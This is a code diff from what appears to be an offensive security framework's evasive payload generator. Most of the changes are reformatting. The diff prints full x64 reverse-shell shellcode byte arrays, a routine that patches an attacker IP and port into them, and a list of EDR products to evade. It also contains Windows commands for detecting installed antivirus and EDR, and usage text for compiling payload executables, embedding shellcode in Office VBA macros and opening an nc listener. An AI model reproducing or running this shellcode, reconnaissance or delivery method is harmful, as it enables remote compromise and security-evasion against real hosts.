@@ -16,40 +16,219 @@ import cmd2
 
 from cli.commands._base import LazyOwnCommandSet
 from utils import (
+    copy2clip,
     print_error,
     print_msg,
-    print_warn,
 )
 
 PAYLOAD_CATEGORY = "05. Payload Generation"
 
 NOP_SLED = b"\x90" * 8
-XOR_DECODER_X64 = bytes([0x48, 0x31, 0xF6, 0x56, 0x5E, 0x48, 0x31, 0xFF, 0xB2, 0xFF, 0x48, 0x31, 0xC0, 0xB0, 0x3B, 0x0F, 0x05])
+XOR_DECODER_X64 = bytes(
+    [0x48, 0x31, 0xF6, 0x56, 0x5E, 0x48, 0x31, 0xFF, 0xB2, 0xFF, 0x48, 0x31, 0xC0, 0xB0, 0x3B, 0x0F, 0x05]
+)
 
-REVERSE_SHELL_X64 = bytes([
-    0x6A, 0x29, 0x58, 0x99, 0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x0F, 0x05, 0x48, 0x97, 0x48, 0xB9,
-    0x02, 0x00, 0x11, 0x5C, 0x7F, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xE6, 0x6A, 0x10, 0x5A, 0x6A,
-    0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E, 0x48, 0xFF, 0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75,
-    0xF6, 0x6A, 0x3B, 0x58, 0x99, 0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53,
-    0x48, 0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 0x0F, 0x05,
-])
+REVERSE_SHELL_X64 = bytes(
+    [
+        0x6A,
+        0x29,
+        0x58,
+        0x99,
+        0x6A,
+        0x02,
+        0x5F,
+        0x6A,
+        0x01,
+        0x5E,
+        0x0F,
+        0x05,
+        0x48,
+        0x97,
+        0x48,
+        0xB9,
+        0x02,
+        0x00,
+        0x11,
+        0x5C,
+        0x7F,
+        0x00,
+        0x00,
+        0x01,
+        0x51,
+        0x48,
+        0x89,
+        0xE6,
+        0x6A,
+        0x10,
+        0x5A,
+        0x6A,
+        0x2A,
+        0x58,
+        0x0F,
+        0x05,
+        0x6A,
+        0x03,
+        0x5E,
+        0x48,
+        0xFF,
+        0xCE,
+        0x6A,
+        0x21,
+        0x58,
+        0x0F,
+        0x05,
+        0x75,
+        0xF6,
+        0x6A,
+        0x3B,
+        0x58,
+        0x99,
+        0x48,
+        0xBB,
+        0x2F,
+        0x62,
+        0x69,
+        0x6E,
+        0x2F,
+        0x73,
+        0x68,
+        0x00,
+        0x53,
+        0x48,
+        0x89,
+        0xE7,
+        0x52,
+        0x57,
+        0x48,
+        0x89,
+        0xE6,
+        0x0F,
+        0x05,
+    ]
+)
 
-SYSCALL_SHELL_X64 = bytes([
-    0x48, 0x31, 0xC0, 0x48, 0x31, 0xFF, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2,
-    0x6A, 0x02, 0x5F, 0x6A, 0x01, 0x5E, 0x6A, 0x06, 0x5A, 0x6A, 0x29, 0x58,
-    0x0F, 0x05, 0x48, 0x97, 0x48, 0xBE, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x48, 0xBF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x66, 0xB8, 0x02, 0x00, 0x66, 0xBF, 0x00, 0x00, 0x48, 0x89, 0xE6, 0x6A,
-    0x10, 0x5A, 0x6A, 0x2A, 0x58, 0x0F, 0x05, 0x6A, 0x03, 0x5E, 0x48, 0xFF,
-    0xCE, 0x6A, 0x21, 0x58, 0x0F, 0x05, 0x75, 0xF6, 0x6A, 0x3B, 0x58, 0x99,
-    0x48, 0xBB, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x53, 0x48,
-    0x89, 0xE7, 0x52, 0x57, 0x48, 0x89, 0xE6, 0x0F, 0x05,
-])
+SYSCALL_SHELL_X64 = bytes(
+    [
+        0x48,
+        0x31,
+        0xC0,
+        0x48,
+        0x31,
+        0xFF,
+        0x48,
+        0x31,
+        0xF6,
+        0x48,
+        0x31,
+        0xD2,
+        0x6A,
+        0x02,
+        0x5F,
+        0x6A,
+        0x01,
+        0x5E,
+        0x6A,
+        0x06,
+        0x5A,
+        0x6A,
+        0x29,
+        0x58,
+        0x0F,
+        0x05,
+        0x48,
+        0x97,
+        0x48,
+        0xBE,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x48,
+        0xBF,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x00,
+        0x66,
+        0xB8,
+        0x02,
+        0x00,
+        0x66,
+        0xBF,
+        0x00,
+        0x00,
+        0x48,
+        0x89,
+        0xE6,
+        0x6A,
+        0x10,
+        0x5A,
+        0x6A,
+        0x2A,
+        0x58,
+        0x0F,
+        0x05,
+        0x6A,
+        0x03,
+        0x5E,
+        0x48,
+        0xFF,
+        0xCE,
+        0x6A,
+        0x21,
+        0x58,
+        0x0F,
+        0x05,
+        0x75,
+        0xF6,
+        0x6A,
+        0x3B,
+        0x58,
+        0x99,
+        0x48,
+        0xBB,
+        0x2F,
+        0x62,
+        0x69,
+        0x6E,
+        0x2F,
+        0x73,
+        0x68,
+        0x00,
+        0x53,
+        0x48,
+        0x89,
+        0xE7,
+        0x52,
+        0x57,
+        0x48,
+        0x89,
+        0xE6,
+        0x0F,
+        0x05,
+    ]
+)
 
 EDR_NAMES = [
-    "CrowdStrike Falcon", "Microsoft Defender", "SentinelOne",
-    "Carbon Black", "Cylance", "McAfee ENS", "Symantec Endpoint",
-    "Trend Micro", "Sophos", "Elastic EDR", "Palo Alto Cortex XDR",
+    "CrowdStrike Falcon",
+    "Microsoft Defender",
+    "SentinelOne",
+    "Carbon Black",
+    "Cylance",
+    "McAfee ENS",
+    "Symantec Endpoint",
+    "Trend Micro",
+    "Sophos",
+    "Elastic EDR",
+    "Palo Alto Cortex XDR",
 ]
 
 BYPASS_TECHNIQUES = {
@@ -192,12 +371,30 @@ class EvasivePayloadCommandSet(LazyOwnCommandSet):
         password = _extract_flag(args, "--password")
 
         edr_checks = [
-            ("WMI AntiVirusProduct", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list"),
-            ("WMI AntiSpywareProduct", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiSpywareProduct get displayName /format:list"),
-            ("Service enumeration", "sc query state= all | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex\""),
-            ("Process enumeration", "tasklist | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex falcon\""),
-            ("Registry uninstall", r"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos\""),
-            ("Driver check", "driverquery | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend\""),
+            (
+                "WMI AntiVirusProduct",
+                "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState /format:list",
+            ),
+            (
+                "WMI AntiSpywareProduct",
+                "wmic /namespace:\\\\root\\SecurityCenter2 path AntiSpywareProduct get displayName /format:list",
+            ),
+            (
+                "Service enumeration",
+                'sc query state= all | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex"',
+            ),
+            (
+                "Process enumeration",
+                'tasklist | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos elastic cortex falcon"',
+            ),
+            (
+                "Registry uninstall",
+                r"reg query \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" /s | findstr /i \"defender crowdstrike sentinelone carbon cylance mcafee symantec trend sophos\"",
+            ),
+            (
+                "Driver check",
+                'driverquery | findstr /i "defender crowdstrike sentinelone carbon cylance mcafee symantec trend"',
+            ),
         ]
 
         if target:
@@ -318,7 +515,7 @@ class EvasivePayloadCommandSet(LazyOwnCommandSet):
         """Print usage instructions for the generated payload."""
         print_msg("\n--- Usage ---")
         if fmt == "raw":
-            print_msg(f"Execute via shellcode loader:")
+            print_msg("Execute via shellcode loader:")
             print_msg(f"  python3 modules/lazy_shellcode_loader.py {path}")
         elif fmt == "c":
             print_msg(f"Compile: x86_64-w64-mingw32-gcc {path} -o payload.exe")
@@ -327,9 +524,9 @@ class EvasivePayloadCommandSet(LazyOwnCommandSet):
         elif fmt == "py":
             print_msg(f"Run: python3 {path}")
         elif fmt == "vba":
-            print_msg(f"Paste into VBA macro in Office document")
+            print_msg("Paste into VBA macro in Office document")
         elif fmt == "hex":
-            print_msg(f"Paste hex string into shellcode loader")
+            print_msg("Paste hex string into shellcode loader")
         print_msg(f"Start listener: nc -lvnp {lport}")
 
     @cmd2.with_category(PAYLOAD_CATEGORY)
@@ -405,10 +602,10 @@ def _generate_shellcode(lhost: str, lport: int, target_os: str, arch: str) -> by
 
         shellcode = bytearray(REVERSE_SHELL_X64)
         for i in range(len(shellcode) - 8):
-            if shellcode[i:i+2] == b"\x11\x5C":
-                shellcode[i:i+2] = port_bytes
-            if shellcode[i:i+8] == b"\x00\x00\x00\x00\x00\x00\x00\x01":
-                shellcode[i-1:i+7] = b"\x00" + ip_bytes
+            if shellcode[i : i + 2] == b"\x11\x5c":
+                shellcode[i : i + 2] = port_bytes
+            if shellcode[i : i + 8] == b"\x00\x00\x00\x00\x00\x00\x00\x01":
+                shellcode[i - 1 : i + 7] = b"\x00" + ip_bytes
                 break
         return bytes(shellcode)
     else:
@@ -450,7 +647,7 @@ def _apply_bypass(shellcode: bytes, technique: str, target_os: str) -> bytes:
         sc = bytearray(SYSCALL_SHELL_X64)
         ip_offset = sc.find(b"\x00\x00\x00\x00\x00\x00\x00\x00")
         if ip_offset >= 0:
-            sc[ip_offset:ip_offset+8] = b"\x00\x00" + ip_bytes
+            sc[ip_offset : ip_offset + 8] = b"\x00\x00" + ip_bytes
         return bytes(sc)
 
     return shellcode
